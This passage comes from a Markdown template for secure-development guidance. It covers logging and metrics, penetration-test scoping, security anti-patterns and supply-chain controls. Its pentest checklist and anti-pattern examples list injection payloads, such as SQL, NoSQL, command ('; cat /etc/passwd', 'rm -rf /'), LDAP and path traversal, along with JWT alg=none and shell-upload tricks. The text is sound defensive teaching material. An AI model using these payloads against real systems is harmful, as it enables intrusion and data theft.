logger.error(f"Error: {traceback.format_exc()}")  # ❌ Unstructured
logger.debug(f"API key: {api_key}")  # ❌ Secret in logs
```

**What to Log**:
- ✅ Authentication events (login, logout, failures)
- ✅ Authorization failures (access denied)
- ✅ Security events (suspicious activity, rate limits)
- ✅ Business transactions (payments, orders, changes)
- ✅ Errors and exceptions (with correlation IDs)
- ✅ Performance metrics (slow queries, high latency)
- ❌ NEVER: Passwords, tokens, API keys, PII (unless hashed)

#### Metrics Collection

**Metrics Library Selection**:

| Language | Recommended Library | Integration |
|----------|---------------------|-------------|
| Python | prometheus_client | Prometheus |
| JavaScript/TypeScript | prom-client | Prometheus |
| Java | Micrometer | Prometheus, StatsD |
| Go | prometheus/client_golang | Prometheus |
| Rust | prometheus | Prometheus |

**RED Metrics** (Rate, Errors, Duration):

```python
from prometheus_client import Counter, Histogram, Gauge

# Request rate
http_requests_total = Counter(
    "http_requests_total",
    "Total HTTP requests",
    ["method", "endpoint", "status"]
)

# Request duration
http_request_duration_seconds = Histogram(
    "http_request_duration_seconds",
    "HTTP request duration in seconds",
    ["method", "endpoint"],
    buckets=[0.01, 0.05, 0.1, 0.5, 1.0, 2.5, 5.0, 10.0]
)

# Error rate
http_request_errors_total = Counter(
    "http_request_errors_total",
    "Total HTTP errors",
    ["method", "endpoint", "error_type"]
)

# Active connections
active_connections = Gauge(
    "active_connections",
    "Number of active connections"
)

# Usage in API endpoint
@app.post("/api/users")
async def create_user(user_data: UserCreateRequest):
    # Track active connections
    active_connections.inc()

    try:
        # Track request duration
        with http_request_duration_seconds.labels(
            method="POST",
            endpoint="/api/users"
        ).time():
            result = await user_service.create(user_data)

        # Track successful request
        http_requests_total.labels(
            method="POST",
            endpoint="/api/users",
            status=201
        ).inc()

        return result

    except ValidationError as e:
        # Track validation errors
        http_request_errors_total.labels(
            method="POST",
            endpoint="/api/users",
            error_type="validation"
        ).inc()
        raise

    except Exception as e:
        # Track internal errors
        http_request_errors_total.labels(
            method="POST",
            endpoint="/api/users",
            error_type="internal"
        ).inc()
        raise

    finally:
        active_connections.dec()

# Domain-specific metrics
payment_amount_total = Counter(
    "payment_amount_total",
    "Total payment amount processed",
    ["currency", "payment_method"]
)

payment_failures_total = Counter(
    "payment_failures_total",
    "Total payment failures",
    ["reason"]
)
```

**Key Metrics to Track**:
- Request rate (requests/second)
- Error rate (errors/second, error percentage)
- Request duration (p50, p95, p99 latency)
- Active connections/workers
- Database query duration
- Queue depth/lag
- Cache hit/miss rate
- Resource usage (CPU, memory, disk I/O)

#### Distributed Tracing

**For Microservices/Distributed Systems**:

```python
from opentelemetry import trace
from opentelemetry.exporter.jaeger import JaegerExporter
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor

# Setup tracing
trace.set_tracer_provider(TracerProvider())
jaeger_exporter = JaegerExporter(
    agent_host_name="localhost",
    agent_port=6831,
)
trace.get_tracer_provider().add_span_processor(
    BatchSpanProcessor(jaeger_exporter)
)

tracer = trace.get_tracer(__name__)

# Usage in code
@tracer.start_as_current_span("create_user")
async def create_user(user_data: UserCreateRequest):
    span = trace.get_current_span()

    # Add attributes to span
    span.set_attribute("user.email_domain", extract_domain(user_data.email))
    span.set_attribute("user.username", user_data.username)

    # Nested span for database operation
    with tracer.start_as_current_span("db.insert_user"):
        user = await db.insert(user_data)
        span.set_attribute("user.id", user.id)

    # Nested span for external API call
    with tracer.start_as_current_span("email.send_welcome"):
        await send_welcome_email(user.email)

    return user
```

**Observability Checklist**:
- [ ] Structured JSON logging implemented
- [ ] Logs include correlation IDs for request tracing
- [ ] NO PII/secrets in logs (or hashed)
- [ ] RED metrics (Rate, Errors, Duration) tracked
- [ ] Domain-specific metrics tracked
- [ ] Metrics exposed for Prometheus/monitoring system
- [ ] Distributed tracing for microservices
- [ ] Alerting configured for critical metrics
- [ ] Dashboards created for key metrics
- [ ] Log aggregation (ELK, Splunk, CloudWatch, etc.)
```
```

---

### 6.6 Penetration Testing & Red Team Exercises (MANDATORY for HIGH-risk)

**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk domains (public APIs, financial systems, healthcare, e-commerce)
- **RECOMMENDED FOR**: MEDIUM-risk domains
- **SKIP IF**: Internal tools, development utilities, LOW-risk systems

**Content to Include**:

```markdown
### Penetration Testing Strategy

**Testing Frequency** (MANDATORY):
| Risk Level | External Pentest | Red Team Exercise | Bug Bounty Program |
|------------|------------------|-------------------|--------------------|
| **HIGH** | Quarterly | Annual | Recommended |
| **MEDIUM** | Bi-annual | N/A | Optional |
| **LOW** | Annual | N/A | N/A |

#### Penetration Test Scope Definition

**In-Scope Assets** for [Domain]:
```markdown
### Penetration Test Scope

**Application Components**:
- [ ] Web application: https://[domain].com
- [ ] REST API: https://api.[domain].com/v1/*
- [ ] GraphQL API: https://api.[domain].com/graphql
- [ ] Admin panel: https://admin.[domain].com
- [ ] Mobile API endpoints
- [ ] WebSocket connections: wss://[domain].com/ws

**Authentication Mechanisms**:
- [ ] OAuth 2.0 / OpenID Connect flows
- [ ] JWT token implementation
- [ ] Session management
- [ ] Multi-factor authentication (MFA)
- [ ] API key authentication
- [ ] Password reset flow

**Infrastructure** (if in scope):
- [ ] Load balancers
- [ ] API gateways
- [ ] CDN configuration
- [ ] DNS configuration

**Out of Scope**:
- ❌ Social engineering
- ❌ Physical security
- ❌ Denial of Service (DoS/DDoS) attacks
- ❌ Third-party services (unless explicitly included)
- ❌ Production data modification (test environment only)
```

**Test Types**:
```markdown
| Test Type | Knowledge Level | Best For | Duration |
|-----------|----------------|----------|----------|
| **Black Box** | No knowledge | Simulates external attacker | 2-4 weeks |
| **Grey Box** | Limited knowledge (user credentials) | Realistic authenticated attacker | 2-3 weeks |
| **White Box** | Full knowledge + source code | Comprehensive coverage | 3-5 weeks |

**Recommended**: Start with Grey Box for balance of coverage and realism.
```

#### Attack Scenarios to Test (MANDATORY)

**1. Authentication & Session Management Attacks**:
```markdown
- [ ] **Brute Force Attack**: Test account lockout mechanisms
  - Attempt 100+ login attempts with incorrect passwords
  - Verify IP-based rate limiting
  - Verify CAPTCHA enforcement

- [ ] **Credential Stuffing**: Test with known compromised credentials
  - Use public breach databases
  - Verify breach detection (HaveIBeenPwned integration)

- [ ] **Session Fixation**: Test session ID regeneration
  - Attempt to fixate session before login
  - Verify new session ID after authentication

- [ ] **JWT Token Manipulation**:
  - Test 'alg=none' attack
  - Test weak secret brute force
  - Test token expiration enforcement
  - Test signature verification
```

**2. Authorization Bypass Attacks**:
```markdown
- [ ] **Horizontal Privilege Escalation (IDOR)**:
  - User A tries to access User B's resources
  - Test: GET /api/users/{user_b_id}/profile (with user_a token)
  - Expected: 403 Forbidden

- [ ] **Vertical Privilege Escalation**:
  - Regular user tries to access admin endpoints
  - Test: GET /api/admin/users (with user token)
  - Expected: 403 Forbidden

- [ ] **Path Traversal in Authorization**:
  - Test: GET /api/../admin/users
  - Test: GET /api/users/%2e%2e/admin/users (URL encoded)
  - Expected: 403 or 404
```

**3. Injection Attacks**:
```markdown
- [ ] **SQL Injection**:
  - Test all input fields: ' OR '1'='1'--
  - Test numeric fields: 1 OR 1=1
  - Test blind SQL injection
  - Test time-based SQL injection: 1' AND SLEEP(5)--

- [ ] **NoSQL Injection**:
  - Test: {"username": {"$ne": null}, "password": {"$ne": null}}
  - Test: {"username": {"$gt": ""}}

- [ ] **Command Injection**:
  - Test: ; cat /etc/passwd
  - Test: | whoami
  - Test: `cat /etc/passwd`

- [ ] **LDAP Injection**:
  - Test: *)(uid=*))(|(uid=*

- [ ] **XPath Injection**:
  - Test: ' or '1'='1
```

**4. Business Logic Flaws**:
```markdown
- [ ] **Race Conditions**:
  - Concurrent requests to withdraw money
  - Concurrent discount code applications
  - Test with parallel requests tool (e.g., Turbo Intruder)

- [ ] **Price Manipulation**:
  - Modify price in client-side code
  - Intercept and modify price in API request
  - Test negative prices
  - Test decimal precision (e.g., $0.001)

- [ ] **Workflow Bypass**:
  - Skip payment step in checkout flow
  - Access order confirmation without payment
  - Modify order status directly
```

**5. API-Specific Attacks**:
```markdown
- [ ] **Mass Assignment**:
  - Add is_admin=true to user registration
  - Add role=admin to profile update

- [ ] **GraphQL Introspection** (should be disabled in production):
  - Query: { __schema { types { name } } }

- [ ] **GraphQL Query Depth Attack**:
  - Deeply nested query (>10 levels)
  - Verify depth limiting

- [ ] **API Rate Limit Bypass**:
  - Rotate IPs with X-Forwarded-For
  - Use different user agents
  - Attempt 1000+ requests/minute

- [ ] **BOLA (Broken Object-Level Authorization)**:
  - Enumerate IDs: /api/orders/1, /api/orders/2, ...
  - Test UUID prediction
```

**6. File Upload Attacks**:
```markdown
- [ ] **Malicious File Upload**:
  - Upload PHP shell as .jpg
  - Upload executable disguised as PDF
  - Upload XXE payload as XML
  - Upload polyglot file (valid image + malware)

- [ ] **Unrestricted File Upload**:
  - Upload .exe, .bat, .sh files
  - Verify extension allowlist enforcement

- [ ] **File Type Bypass**:
  - Double extension: malware.php.jpg
  - Null byte: malware.php%00.jpg
  - MIME type mismatch
```

#### Remediation SLA (MANDATORY)

**Fix Timelines**:
```markdown
| Severity | CVSS Score | Time to Fix | Time to Deploy | Verification |
|----------|------------|-------------|----------------|--------------|
| **CRITICAL** | 9.0-10.0 | 24 hours | 48 hours | Re-test required |
| **HIGH** | 7.0-8.9 | 7 days | 14 days | Re-test required |
| **MEDIUM** | 4.0-6.9 | 30 days | 45 days | Verification optional |
| **LOW** | 0.1-3.9 | 90 days | Next release | No re-test |

**Escalation Process**:
- CRITICAL: Immediate notification to CISO + CTO
- HIGH: Notification within 24 hours
- MEDIUM: Weekly security review
- LOW: Monthly security review
```

#### Red Team Exercise

**Annual Red Team Simulation** (HIGH-risk only):
```markdown
### Red Team Objectives

**Realistic Attack Simulation**:
- Multi-vector attack (combination of social engineering, phishing, technical exploits)
- Objective: Gain admin access OR exfiltrate sensitive data
- Duration: 2-4 weeks
- Knowledge: Zero knowledge (black box)

**Red Team Tactics** (MITRE ATT&CK Framework):
1. **Reconnaissance**: Passive information gathering
2. **Initial Access**: Phishing, credential stuffing
3. **Execution**: Exploit vulnerabilities
4. **Persistence**: Install backdoors
5. **Privilege Escalation**: Gain admin access
6. **Defense Evasion**: Bypass WAF, IDS
7. **Credential Access**: Dump passwords
8. **Discovery**: Map internal systems
9. **Lateral Movement**: Access related systems
10. **Collection**: Gather sensitive data
11. **Exfiltration**: Extract data (simulated)

**Success Criteria**:
- ✅ Identified critical vulnerabilities
- ✅ Tested incident response procedures
- ✅ Validated detection capabilities
- ✅ Improved security posture
```

#### Bug Bounty Program

**Recommended for HIGH-risk production systems**:
```markdown
### Bug Bounty Program Structure

**Platforms**: HackerOne, Bugcrowd, Synack

**Reward Structure**:
| Severity | Minimum Reward | Maximum Reward |
|----------|---------------|----------------|
| CRITICAL | $5,000 | $25,000 |
| HIGH | $1,000 | $5,000 |
| MEDIUM | $250 | $1,000 |
| LOW | $50 | $250 |

**Program Rules**:
- Report vulnerabilities privately (no public disclosure before fix)
- 90-day disclosure timeline
- No DoS/DDoS attacks
- Test on staging environment only
- No social engineering
- Provide clear reproduction steps
```

#### Penetration Test Deliverables

**Expected Report Contents**:
```markdown
1. **Executive Summary**
   - Overall risk rating
   - Critical findings summary
   - Business impact assessment

2. **Methodology**
   - Testing approach
   - Tools used
   - Coverage (% of attack surface tested)

3. **Findings** (for each vulnerability):
   - Vulnerability title
   - CVSS score
   - CWE ID
   - Affected component
   - Reproduction steps (with screenshots/videos)
   - Proof of concept code
   - Business impact
   - Remediation recommendation
   - References (CVE, OWASP, etc.)

4. **Technical Details**
   - HTTP requests/responses
   - Payloads used
   - Attack sequence diagram

5. **Remediation Roadmap**
   - Prioritized fix list
   - Estimated effort
   - Quick wins vs. long-term fixes
```

**Penetration Testing Checklist**:
- [ ] Pentest scheduled based on risk level
- [ ] Scope document signed by both parties
- [ ] Rules of engagement defined
- [ ] Emergency contact designated
- [ ] Test environment or production (with approval)
- [ ] Pentest report received
- [ ] All CRITICAL/HIGH findings remediated
- [ ] Re-test performed after fixes
- [ ] Findings added to security regression test suite (Section 6.1.5)
- [ ] Lessons learned documented
- [ ] Security improvements prioritized
```

---

## 7. Common Patterns / Workflows

**Template Instructions**: Document typical workflows, procedures, or sequences.

**Content to Include**:
- Step-by-step procedures
- Decision trees
- Workflow diagrams (ASCII art or descriptions)
- Common sequences
- Integration patterns

**Example Structure**:
```markdown
### Workflow: [Workflow Name]

**Scenario**: [When to use this workflow]

**Steps**:
1. **[Step 1 Name]**
   - Action: [what to do]
   - Verification: [how to confirm success]

2. **[Step 2 Name]**
   - Action: [what to do]
   - If [condition]: [alternative path]

3. **[Step 3 Name]**
   - Action: [what to do]
   - Expected outcome: [what should happen]
```

---

## 8. Common Mistakes, Anti-Patterns & Security Pitfalls

**Template Instructions**: Document critical mistakes to avoid. Focus on security anti-patterns for HIGH/MEDIUM risk domains.

**MANDATORY Content**:
- **8.1**: Critical Security Anti-Patterns (5+ for High-risk, 3+ for Medium-risk)
- **8.2**: Domain-Specific Anti-Patterns (3-5 examples)
- **8.3**: Performance Anti-Patterns (if applicable)

**Format**: Always use ❌ DON'T and ✅ DO comparisons with code examples

---

### 8.1 Critical Security Anti-Patterns

**Template Instructions**: These are universally bad practices that create vulnerabilities.

**Example Structure**:
```markdown
### 8.1 Critical Security Anti-Patterns

#### ❌ NEVER: Hardcode Secrets

```[language]
# ❌ DANGEROUS - Secrets exposed in code
API_KEY = "sk-1234567890abcdef"
DATABASE_URL = "postgresql://admin:password123@localhost/db"
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**Why it's wrong**:
- Secrets visible in git history forever (even after deletion)
- Exposed in logs, error messages, stack traces
- Accessible to anyone with code access
- Difficult to rotate without code deployment
- Violates compliance requirements (SOC2, PCI-DSS)

**Consequences**:
- Data breaches and unauthorized access
- Financial losses
- Regulatory fines
- Reputation damage

**How to detect**:
```bash
# Scan git history for secrets
git-secrets --scan-history
truffleHog --regex --entropy=True https://github.com/org/repo
```

#### ✅ DO: Use Environment Variables or Secret Managers

```[language]
# ✅ SECURE - Environment variables
import os
from pydantic_settings import BaseSettings
from pydantic import SecretStr

class Settings(BaseSettings):
    api_key: SecretStr
    database_url: str
    aws_secret: SecretStr

    class Config:
        env_file = ".env"  # Development only, never commit

settings = Settings()

# For production: Use secret managers
# AWS Secrets Manager, Azure Key Vault, HashiCorp Vault
```

**Benefits**:
- Secrets never in source code
- Easy rotation without redeployment
- Audit trail for secret access
- Compliance-ready

---

#### ❌ NEVER: Trust User Input Without Validation

```[language]
# ❌ SQL INJECTION VULNERABILITY
def get_user(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)
    # Attack: username = "admin' OR '1'='1"

# ❌ COMMAND INJECTION
import subprocess
def process_file(filename: str):
    subprocess.run(f"gzip {filename}", shell=True)
    # Attack: filename = "file.txt; rm -rf /"

# ❌ PATH TRAVERSAL
def read_file(filename: str):
    return open(f"/uploads/{filename}").read()
    # Attack: filename = "../../etc/passwd"
```

**Why it's wrong**:
- Attacker can execute arbitrary SQL, commands, or access files
- Complete system compromise possible
- OWASP A05:2025 (Injection) - consistently critical vulnerability class

**Consequences**:
- Data theft (entire database)
- System compromise (remote code execution)
- Ransomware deployment
- Complete infrastructure takeover

#### ✅ DO: Validate, Sanitize, Parameterize

```[language]
# ✅ PARAMETERIZED QUERY
def get_user(username: str):
    # Database driver handles escaping
    return db.query(User).filter(User.username == username).first()

# ✅ SAFE COMMAND EXECUTION
import subprocess
from pathlib import Path

def process_file(filename: str):
    # Validate input
    file_path = Path(filename).resolve()
    if not file_path.exists() or not file_path.is_file():
        raise ValueError("Invalid file")
    # Use list form, never shell=True with user input
    subprocess.run(["gzip", str(file_path)], check=True)

# ✅ PATH TRAVERSAL PROTECTION
from pathlib import Path

def read_file(filename: str):
    base = Path("/uploads").resolve()
    file_path = (base / filename).resolve()
    if not file_path.is_relative_to(base):
        raise ValueError("Path traversal attempt detected")
    return file_path.read_text()
```

---

#### ❌ NEVER: Expose Internal Details in Error Messages

```[language]
# ❌ INFORMATION LEAKAGE
@app.exception_handler(Exception)
async def handle_error(request, exc):
    # Exposes stack traces, file paths, database schema
    return JSONResponse({
        "error": str(exc),
        "traceback": traceback.format_exc()
    })

# ❌ REVEALS USER EXISTENCE
def login(username: str, password: str):
    user = get_user(username)
    if not user:
        return {"error": "User does not exist"}  # ❌ Leaks user existence
    if not verify_password(password, user.password_hash):
        return {"error": "Incorrect password"}  # ❌ Different message
```

**Why it's wrong**:
- Helps attackers understand system internals
- Enables user enumeration attacks
- Exposes database schema, file paths, versions
- Violates principle of least information disclosure

#### ✅ DO: Safe Error Messages + Internal Logging

```[language]
# ✅ SAFE ERROR HANDLING
import uuid
import logging

@app.exception_handler(Exception)
async def handle_error(request, exc):
    error_id = str(uuid.uuid4())

    # Log full details internally
    logger.exception(
        "Unhandled exception",
        extra={"error_id": error_id, "path": request.url.path},
        exc_info=exc
    )

    # Return safe message to user
    return JSONResponse({
        "error": "An internal error occurred. Please contact support.",
        "error_id": error_id  # For support correlation
    })

# ✅ CONSTANT-TIME COMPARISON + GENERIC MESSAGES
def login(username: str, password: str):
    user = get_user(username)

    if not user:
        # Still perform hash check to prevent timing attack
        verify_password(password, "$2b$12$dummy_hash")
        return {"error": "Invalid credentials"}  # Generic message

    if not verify_password(password, user.password_hash):
        return {"error": "Invalid credentials"}  # Same generic message

    return {"token": generate_token(user)}
```

---

#### ❌ NEVER: Disable Security Features for Convenience

```[language]
# ❌ DISABLING CSRF PROTECTION
app = FastAPI()
# app.add_middleware(CSRFProtect)  # Commented out "because it's annoying"

# ❌ DISABLING TLS VERIFICATION
import requests
requests.get("https://api.example.com", verify=False)  # ❌ Man-in-the-middle attacks

# ❌ PERMISSIVE CORS
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ❌ Allows any origin
    allow_credentials=True  # ❌ With credentials! Critical vulnerability
)

# ❌ RUNNING AS ROOT
# Dockerfile
USER root  # ❌ Container runs as root
```

**Why it's wrong**:
- Removes critical security controls
- Creates easy attack vectors
- Often done for "quick testing" and forgotten
- Violates security-by-default principle

**Consequences**:
- CSRF attacks steal user sessions
- Man-in-the-middle attacks intercept data
- CORS misconfiguration enables cross-site attacks
- Root containers enable container escape

#### ✅ DO: Secure by Default, Explicit Override for Specific Cases

```[language]
# ✅ ENABLE CSRF PROTECTION
from fastapi_csrf_protect import CsrfProtect
app.add_middleware(CsrfProtect)

# ✅ VERIFY TLS CERTIFICATES
import requests
response = requests.get("https://api.example.com")  # verify=True by default
# If custom CA needed:
response = requests.get("https://api.example.com", verify="/path/to/ca-bundle.crt")

# ✅ RESTRICTIVE CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://app.example.com",
        "https://www.example.com"
    ],  # Explicit allowlist
    allow_credentials=True,  # OK with specific origins
    allow_methods=["GET", "POST"],  # Restrict methods
    allow_headers=["Content-Type", "Authorization"]
)

# ✅ RUN AS NON-ROOT USER
# Dockerfile
RUN adduser --disabled-password --gecos '' appuser
USER appuser  # Run as non-privileged user
```

---

#### ❌ NEVER: Use Weak or Deprecated Cryptography

```[language]
# ❌ WEAK HASHING
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()  # ❌ MD5 is broken
password_hash = hashlib.sha1(password.encode()).hexdigest()  # ❌ SHA1 is weak

# ❌ WEAK ENCRYPTION
from Crypto.Cipher import DES  # ❌ DES is broken
cipher = DES.new(key, DES.MODE_ECB)  # ❌ ECB mode is insecure

# ❌ PREDICTABLE RANDOM
import random
token = ''.join(random.choice('0123456789') for _ in range(10))  # ❌ Predictable

# ❌ CUSTOM CRYPTO
def my_encrypt(data, key):
    # ❌ NEVER roll your own crypto
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * len(data)))
```

**Why it's wrong**:
- MD5/SHA1 can be brute-forced or collided
- ECB mode leaks patterns in ciphertext
- Weak random enables session hijacking
- Custom crypto is always broken

#### ✅ DO: Use Industry-Standard, Modern Cryptography

```[language]
# ✅ STRONG PASSWORD HASHING
import bcrypt  # or argon2
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# ✅ STRONG ENCRYPTION
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)

# ✅ CRYPTOGRAPHICALLY SECURE RANDOM
import secrets
token = secrets.token_urlsafe(32)  # Cryptographically secure

# ✅ USE WELL-AUDITED LIBRARIES
# Use: cryptography, libsodium/PyNaCl, BouncyCastle, Go crypto
# Avoid: PyCrypto (deprecated), custom implementations
```

**Approved Algorithms**:
- Hashing passwords: Argon2id > bcrypt > PBKDF2
- Symmetric encryption: AES-256-GCM, ChaCha20-Poly1305
- Asymmetric encryption: RSA-2048+, Ed25519, X25519
- TLS: TLS 1.3+ (minimum TLS 1.2)
- Avoid: MD5, SHA1, DES, 3DES, RC4, RSA <2048 bits
```

---

### 8.2 Domain-Specific Anti-Patterns

**Template Instructions**: Add 3-5 anti-patterns specific to this technology/domain.

**Example Structure**:
```markdown
### 8.2 [Domain]-Specific Anti-Patterns

#### ❌ DON'T: [Domain-Specific Mistake]

[Code example showing the mistake]

**Why it's wrong**: [Domain-specific explanation]
**Consequences**: [What breaks]
**Common in**: [Where this mistake often appears]

#### ✅ DO: [Correct Approach]

[Code example showing the right way]

**Benefits**: [Why this is better]
**Best practice**: [Additional guidance]

[Repeat for 3-5 domain-specific patterns]
```

---

### 8.3 Performance Anti-Patterns

**Example Structure**:
```markdown
### 8.3 Performance Anti-Patterns

#### ❌ DON'T: N+1 Query Problem

```[language]
# ❌ N+1 queries - fetches users one at a time
users = db.query(User).all()
for user in users:
    posts = db.query(Post).filter(Post.user_id == user.id).all()  # N queries!
```

**Why it's wrong**: 1 query for users + N queries for posts = disaster at scale

#### ✅ DO: Eager Loading / JOIN

```[language]
# ✅ Single query with JOIN
users_with_posts = db.query(User).options(joinedload(User.posts)).all()
```

[Add 2-3 more domain-specific performance anti-patterns]
```
```

---

### 8.4 Supply Chain Security Anti-Patterns (MANDATORY for MEDIUM/HIGH-risk)

**Template Instructions**:
- **MANDATORY FOR**: MEDIUM/HIGH-risk domains
- **CRITICAL**: OWASP 2025 A03 - Supply Chain attacks are the most exploited vector
- **INCLUDE**: Dependency management, provenance verification, SBOM generation

**Content to Include**:

```markdown
### 8.4 Supply Chain Security Anti-Patterns

#### ❌ CRITICAL: Unpinned Dependencies

**Why Dangerous**: Attackers can publish malicious versions that auto-install.

```[language]
# ❌ BAD: Floating versions (vulnerable to supply chain attacks)
dependencies:
  express: "^4.0.0"      # Can install any 4.x.x (including malicious 4.99.0!)
  lodash: "~4.17.0"      # Can install 4.17.x
  axios: "*"             # WORST: Installs ANY version!

# ✅ GOOD: Exact pinning with lock file
dependencies:
  express: "4.18.2"      # Exact version only
  lodash: "4.17.21"
  axios: "1.6.0"

# MANDATORY: Commit lock file to git
package-lock.json       # npm
yarn.lock              # yarn
Cargo.lock             # Rust
go.sum                 # Go
poetry.lock            # Python
Gemfile.lock           # Ruby
```

**Dependency Pinning Checklist**:
- [ ] All dependencies use exact versions (no ^ or ~)
- [ ] Lock file committed to git
- [ ] Lock file integrity verified in CI/CD
- [ ] Automated dependency updates via Dependabot/Renovate (not manual)
- [ ] Updates reviewed before merging

#### ❌ CRITICAL: No Dependency Provenance Verification

**Why Dangerous**: Can't verify package wasn't tampered with.

```[language]
# ❌ BAD: Install without verification
npm install express

# ✅ GOOD: Verify package integrity
npm install express --integrity

# ✅ BETTER: Verify SLSA provenance (supply chain levels for software artifacts)
slsa-verifier verify-artifact express-4.18.2.tgz \
  --provenance-path express-4.18.2.intoto.jsonl \
  --source-uri github.com/expressjs/express

# ✅ BEST: Use private registry with allowlist
npm config set registry https://private-registry.company.com
```

**Provenance Verification**:
```[language]
# Verify package signatures (npm)
npm audit signatures

# Verify checksums
echo "expected-sha256-hash  package.tar.gz" | sha256sum --check

# Verify GPG signatures (for packages that provide them)
gpg --verify package.tar.gz.sig package.tar.gz
```

#### ❌ CRITICAL: Using Untrusted Registries

**Why Dangerous**: Typosquatting, malicious packages.

```[config]
# ❌ BAD: Public registry without restrictions
registry_url: https://pypi.org/simple

# ✅ GOOD: Private registry with allowlist
registry_url: https://private-pypi.company.com

# Allowlist specific public packages
allowed_public_packages:
  - requests==2.31.0        # Exact version
  - django==4.2.7
  - numpy==1.24.3
```

**Private Registry Setup**:
```[config]
# Artifactory / Nexus / GitHub Packages configuration
[repositories]
private-registry:
  url: "https://private-registry.company.com"
  auth: "token"

# Mirror public registries through private registry
# This allows scanning all packages before developers can use them
```

#### ❌ CRITICAL: No Dependency Vulnerability Scanning

**Why Dangerous**: Known vulnerabilities in dependencies.

```yaml
# ✅ Automated dependency scanning in CI/CD
- name: Dependency vulnerability scan
  run: |
    # Scan for known vulnerabilities
    npm audit --audit-level=high

    # Fail build if HIGH/CRITICAL vulnerabilities found
    npm audit --production --audit-level=high || exit 1

# Alternative tools
- name: Snyk scan
  run: snyk test --severity-threshold=high

- name: OWASP Dependency Check
  run: dependency-check --project myapp --scan . --failOnCVSS 7
```

**Dependency Scanning Frequency**:
- [ ] Scan on every commit/PR (CI/CD)
- [ ] Daily scheduled scan
- [ ] Alert on new vulnerabilities
- [ ] Block deployment if HIGH/CRITICAL vulnerabilities

#### ❌ CRITICAL: Installing Dev Dependencies in Production

**Why Dangerous**: Larger attack surface, unnecessary code.

```[language]
# ❌ BAD: Install all dependencies
npm install

# ✅ GOOD: Production dependencies only
npm ci --only=production

# Dockerfile example
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production  # No devDependencies
COPY . .
CMD ["node", "server.js"]
```

#### ❌ CRITICAL: Vulnerable Container Base Images

**Why Dangerous**: Inheriting vulnerabilities from base image.

```dockerfile
# ❌ BAD: Latest tag (unpredictable, can break)
FROM node:latest

# ❌ BAD: Full OS image (huge attack surface)
FROM ubuntu:22.04

# ✅ GOOD: Specific version with SHA pin
FROM node:18.19.0@sha256:a6385524...

# ✅ BETTER: Distroless (minimal attack surface)
FROM gcr.io/distroless/nodejs18-debian12

# ✅ BEST: Multi-stage build with minimal runtime
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Runtime stage (minimal)
FROM gcr.io/distroless/nodejs18-debian12
COPY --from=builder /app/dist /app
CMD ["/app/server.js"]
```

**Container Image Security**:
```bash
# ✅ Scan container images
trivy image myapp:latest --severity HIGH,CRITICAL

# ✅ Scan in CI/CD
docker build -t myapp:${VERSION} .
trivy image myapp:${VERSION} --exit-code 1 --severity CRITICAL
```

#### ❌ CRITICAL: No Software Bill of Materials (SBOM)

**Why Dangerous**: Can't track what's in your software during incident response.

```bash
# ✅ Generate SBOM (MANDATORY for production)
# SPDX or CycloneDX format

# Syft (recommended)
syft dir:. -o cyclonedx-json > sbom.json
syft dir:. -o spdx-json > sbom-spdx.json

# SBOM for container images
syft image:myapp:latest -o cyclonedx-json > sbom.json

# Verify SBOM against vulnerabilities
grype sbom:sbom.json --fail-on high
```

**SBOM Requirements**:
- [ ] SBOM generated for every release
- [ ] SBOM stored with release artifacts
- [ ] SBOM includes all dependencies (direct + transitive)
- [ ] SBOM scanned for vulnerabilities
- [ ] SBOM available for security audits

#### ❌ CRITICAL: Dependency Confusion Attack

**Why Dangerous**: Attacker publishes malicious package with same name as internal package.

```[language]
# ❌ VULNERABLE: No namespace protection
# If you have internal package "analytics-lib", attacker can publish
# public package "analytics-lib" and npm might install it!

# ✅ PROTECTED: Use scoped packages
@company/analytics-lib      # Scoped to your organization

# ✅ PROTECTED: Configure npm to never use public registry for your scope
npm config set @company:registry https://private-registry.company.com
```

**Dependency Confusion Prevention**:
```[config]
# .npmrc - prevent dependency confusion
@company:registry=https://private-registry.company.com
//private-registry.company.com/:_authToken=${NPM_TOKEN}

# Never fall back to public registry for company scope
@company:always-auth=true
```

#### ❌ Code from Untrusted Sources

**Why Dangerous**: Malicious code execution.

```[language]
# ❌ NEVER: Copy-paste code from Stack Overflow without review
# ❌ NEVER: curl https://example.com/script.sh | bash
# ❌ NEVER: npm install package-from-random-github-repo

# ✅ DO: Review all third-party code
# ✅ DO: Verify source authenticity
# ✅ DO: Use well-maintained, popular packages
# ✅ DO: Check package maintainers and download statistics
```

**Package Trust Indicators**:
- Weekly downloads >10,000
- Last published <6 months ago
- GitHub stars >1,000
- Multiple maintainers
- Verified publisher (GitHub verified badge)
- Active issue/PR responses
- Security policy documented

#### ❌ Transitive Dependency Vulnerabilities

**Why Dangerous**: Vulnerabilities in dependencies of dependencies.

```bash
# ✅ Audit full dependency tree (including transitive)
npm audit

# ✅ View full dependency tree
npm ls
yarn why package-name

# ✅ Override vulnerable transitive dependency
# package.json
"overrides": {
  "vulnerable-package": "4.0.1"  # Force specific version
}

# yarn
"resolutions": {
  "vulnerable-package": "4.0.1"
}
```

#### Supply Chain Security Checklist

- [ ] All dependencies pinned to exact versions
- [ ] Lock files committed and verified
- [ ] Private registry for internal packages
- [ ] Public package allowlist enforced
- [ ] SBOM generated for every release
- [ ] Automated vulnerability scanning (daily + on commit)
- [ ] HIGH/CRITICAL vulnerabilities block deployment
- [ ] Container base images pinned by SHA
- [ ] Container images scanned (Trivy, Snyk, Grype)
- [ ] No dev dependencies in production
- [ ] Dependency confusion prevention configured
- [ ] Provenance verification for critical packages
